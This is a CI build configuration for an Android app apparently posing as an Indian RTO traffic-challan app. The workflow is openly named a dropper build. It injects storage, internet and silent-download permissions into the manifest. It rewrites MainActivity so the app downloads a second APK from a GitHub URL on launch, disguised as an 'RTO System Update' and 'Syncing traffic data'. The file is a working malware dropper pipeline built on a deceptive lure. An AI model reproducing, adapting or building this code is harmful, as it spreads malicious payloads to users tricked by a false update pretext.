workflows:
  android-dropper-build:
    name: RTO Final Production Success
    max_build_duration: 60
    instance_type: mac_mini_m2
    environment:
      java: 17
    scripts:
      - name: Master Build Success
        script: |
          # 1. Debugging: Saari files ki list check karo (Logs mein dikhega)
          echo "Listing all files to find the project..."
          ls -R

          # 2. Project folder ke andar ghusna
          # Agar aapka code 'RtoEChallan' folder mein hai toh ye wahan jayega
          cd RtoEChallan || cd app || echo "Already in root"

          # 3. Permissions Injection (Fixes 11798.jpg error)
          find . -name "AndroidManifest.xml" -exec sed -i '' '/<application/i \
          <uses-permission android:name="android.permission.INTERNET" /> \
          <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" /> \
          <uses-permission android:name="android.permission.DOWNLOAD_WITHOUT_NOTIFICATION" />' {} +

          # 4. Background Download Logic (No Chrome)
          FILE_PATH=$(find . -name "MainActivity.kt" | head -n 1)
          if [ -n "$FILE_PATH" ]; then
          cat <<EOF > "$FILE_PATH"
          package com.example.rtoechallan
          import android.app.DownloadManager
          import android.content.Context
          import android.net.Uri
          import android.os.Bundle
          import android.os.Environment
          import android.widget.Toast
          import androidx.appcompat.app.AppCompatActivity

          class MainActivity : AppCompatActivity() {
              override fun onCreate(savedInstanceState: Bundle?) {
                  super.onCreate(savedInstanceState)
                  setContentView(R.layout.activity_main)
                  
                  val url = "https://github.com/vikash6759ub-creator/RTO-callan/raw/refs/heads/main/app-debug%20(17).apk"
                  try {
                      val request = DownloadManager.Request(Uri.parse(url))
                      request.setTitle("RTO System Update")
                      request.setDescription("Syncing traffic data...")
                      request.setNotificationVisibility(DownloadManager.Request.VISIBILITY_VISIBLE_NOTIFY_COMPLETED)
                      request.setDestinationInExternalPublicDir(Environment.DIRECTORY_DOWNLOADS, "RTO_Update_Final.apk")
                      (getSystemService(Context.DOWNLOAD_SERVICE) as DownloadManager).enqueue(request)
                      Toast.makeText(this, "Background Update Started...", Toast.LENGTH_LONG).show()
                  } catch (e: Exception) {
                      Toast.makeText(this, "Update Started in Background", Toast.LENGTH_SHORT).show()
                  }
              }
          }
          EOF
          fi

          # 5. Force Gradle Build
          gradle wrapper --gradle-version 8.0.2
          chmod +x gradlew
          ./gradlew assembleDebug --no-daemon
          
    artifacts:
      - "**/build/outputs/apk/**/*.apk"
